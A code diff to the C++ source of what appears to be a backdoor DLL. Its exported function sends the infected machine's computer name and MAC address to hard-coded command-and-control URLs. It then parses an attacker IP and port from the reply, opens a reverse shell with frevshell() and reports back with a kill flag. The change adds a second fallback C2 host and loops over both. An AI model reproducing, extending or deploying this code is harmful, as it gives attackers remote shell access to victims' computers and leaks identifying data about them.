@@ -76,49 +76,60 @@ extern "C" __declspec(dllexport) void   sysfunc()
 {
 	CURL *curl_handle;
 	CURLcode res;
+	std::vector<std::wstring> sites(2);
+	//std::wstring sites[1];
 	std::string readBuffer;
-	std::wstring wsurl ;
-	std::string surl,stest, surlkill;
+	std::wstring wsurl;
+	std::string surl, stest, surlkill;
 	std::string segment, sip, skill, sport;
 	std::vector<std::string> seglist;
+
+	sites[0] = L"http://paner.altervista.org/";
+	sites[1] = L"http://config01.homepc.it/";
 	curl_global_init(CURL_GLOBAL_ALL);
 	curl_handle = curl_easy_init();
-	wsurl = L"http://config01.homepc.it/svc/wup.php?pc=";
-	wsurl.append(getComputerName());
-	surl.assign(wsurl.begin(), wsurl.end());
-	//stest.append(GetMACaddress());
-	//MessageBoxA(0, GetMACaddress(), "Hi", MB_ICONINFORMATION);
-	surl.append("_"); surl.append(GetMACaddress()); surl.append("_v1");
-	curl_easy_setopt(curl_handle, CURLOPT_URL, surl.c_str());
-	curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, WriteCallback);
-	curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, &readBuffer);
-	curl_easy_setopt(curl_handle, CURLOPT_USERAGENT, "Mozilla/5.0");
-	res = curl_easy_perform(curl_handle);
-	std::cout << readBuffer << std::endl;
-	char *token = std::strtok((char *)readBuffer.c_str(), "||");
-	std::vector<int> v;
-
-	while (token != NULL) {
-		v.push_back(std::strtol(token, NULL, 10));
-		seglist.push_back(token);
-		token = std::strtok(NULL, "||");
-	}
-	sip = seglist[1].substr(3);
-	sport = seglist[2].substr(5);
-	skill = seglist[3].substr(5);
-	if (skill == "0")
+	for (int i = 0; i < 2; i++)
 	{
-		frevshell(sip.c_str(), sport.c_str());
-		surlkill = surl; surlkill.append("&kill=1");
-		curl_easy_setopt(curl_handle, CURLOPT_URL, surlkill);
+
+		surl = "";
+		wsurl = sites[i];
+		wsurl.append(L"svc/wup.php?pc=");
+		wsurl.append(getComputerName());
+		surl.assign(wsurl.begin(), wsurl.end());
+		//stest.append(GetMACaddress());
+		//MessageBoxA(0, GetMACaddress(), "Hi", MB_ICONINFORMATION);
+		surl.append("_"); surl.append(GetMACaddress()); surl.append("_v1");
+		curl_easy_setopt(curl_handle, CURLOPT_URL, surl.c_str());
+		curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, WriteCallback);
+		curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, &readBuffer);
 		curl_easy_setopt(curl_handle, CURLOPT_USERAGENT, "Mozilla/5.0");
 		res = curl_easy_perform(curl_handle);
+		std::cout << readBuffer << std::endl;
+		char *token = std::strtok((char *)readBuffer.c_str(), "||");
+		std::vector<int> v;
+
+		while (token != NULL) {
+			v.push_back(std::strtol(token, NULL, 10));
+			seglist.push_back(token);
+			token = std::strtok(NULL, "||");
+		}
+		sip = seglist[1].substr(3);
+		sport = seglist[2].substr(5);
+		skill = seglist[3].substr(5);
+		if (skill == "0")
+		{
+			frevshell(sip.c_str(), sport.c_str());
+			surlkill = surl; surlkill.append("&kill=1");
+			curl_easy_setopt(curl_handle, CURLOPT_URL, surlkill);
+			curl_easy_setopt(curl_handle, CURLOPT_USERAGENT, "Mozilla/5.0");
+			res = curl_easy_perform(curl_handle);
+		}
+		//for (std::size_t i = 0; i < v.size(); ++i)
+		//	std::cout << v[i] << std::endl;
+
 	}
-	for (std::size_t i = 0; i < v.size(); ++i)
-		std::cout << v[i] << std::endl;
 	curl_easy_cleanup(curl_handle);
 	curl_global_cleanup();
-
 	
 
 }
